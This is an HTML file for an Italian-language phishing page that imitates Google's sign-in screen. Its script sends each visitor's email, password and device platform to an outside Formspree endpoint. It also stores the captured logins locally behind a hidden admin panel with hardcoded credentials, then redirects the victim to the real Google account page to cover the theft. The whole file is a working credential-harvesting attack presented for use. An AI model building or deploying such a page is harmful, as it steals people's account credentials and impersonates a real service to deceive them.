<!DOCTYPE html>
<html lang="it">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Google - Accedi</title>
    <style>
        body { font-family: 'Segoe UI', Arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; background: #fff; }
        .card { width: 400px; padding: 40px; border: 1px solid #dadce0; border-radius: 8px; text-align: center; }
        .logo { width: 75px; margin-bottom: 10px; }
        h1 { font-size: 24px; font-weight: 400; margin-bottom: 8px; }
        input { width: 100%; padding: 13px; margin: 10px 0; border: 1px solid #dadce0; border-radius: 4px; font-size: 16px; }
        button { background: #1a73e8; color: #fff; border: none; padding: 10px 24px; border-radius: 4px; cursor: pointer; float: right; font-weight: 500; margin-top: 20px; }
        #admin { display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:#0d1117; color:#7ee787; padding:20px; z-index:1000; overflow:auto; }
        table { width:100%; border-collapse:collapse; margin-top:20px; }
        th, td { border: 1px solid #333; padding: 10px; text-align: left; font-family: monospace; }
    </style>
</head>
<body>

<div id="ui" class="card">
    <img src="https://www.gstatic.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" class="logo">
    <h1>Accedi</h1>
    <p>Usa il tuo Account Google</p>
    <input type="email" id="e" placeholder="Email o telefono" required>
    <input type="password" id="p" placeholder="Password" required>
    <button onclick="sendData()">Avanti</button>
</div>

<div id="admin">
    <h2>[PANNELLO ADMIN LOCALE]</h2>
    <table id="t">
        <tr><th>Data</th><th>Email</th><th>Password</th></tr>
    </table>
    <br><button onclick="location.reload()" style="background:#444; float:none;">Torna al Login</button>
</div>

<script>
    function sendData() {
        const email = document.getElementById('e').value;
        const pass = document.getElementById('p').value;

        // ACCESSO ADMIN
        if (email === "admin@demo.it" && pass === "mostra-tutto") {
            const db = JSON.parse(localStorage.getItem('logs')) || [];
            const table = document.getElementById('t');
            table.innerHTML = "<tr><th>Data</th><th>Email</th><th>Password</th></tr>";
            db.forEach(d => {
                table.innerHTML += `<tr><td>${d.d}</td><td>${d.e}</td><td>${d.p}</td></tr>`;
            });
            document.getElementById('admin').style.display = 'block';
            return;
        }

        if(!email || !pass) { alert("Inserisci i dati"); return; }

        // Salvataggio locale di emergenza (se internet cade o Formspree fallisce)
        let logs = JSON.parse(localStorage.getItem('logs')) || [];
        logs.push({ d: new Date().toLocaleString(), e: email, p: pass });
        localStorage.setItem('logs', JSON.stringify(logs));

        // INVIO REALE A FORMSPREE
        const formData = new FormData();
        formData.append('Email', email);
        formData.append('Password', pass);
        formData.append('Device', navigator.platform);

        fetch("https://formspree.io/f/xzdolnpd", {
            method: "POST",
            body: formData,
            headers: { 'Accept': 'application/json' }
        }).finally(() => {
            // Reindirizzamento forzato dopo l'invio (anche se fallisce)
            document.body.innerHTML = "<div class='card'><h1>Verifica in corso...</h1></div>";
            setTimeout(() => {
                window.location.href = "https://myaccount.google.com/";
            }, 1000);
        });
    }
</script>
</body>
</html>
